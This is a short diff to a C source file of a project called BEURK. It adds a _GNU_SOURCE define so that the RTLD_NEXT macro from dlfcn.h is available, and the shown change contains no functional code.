@@ -18,6 +18,8 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
+#define _GNU_SOURCE /* RTLD_NEXT macro */
+
 #include <string.h> /* strlen() */
 #include <dlfcn.h> /* dlsym(), dlerror() */
 #include "beurk.h" /* prototype */
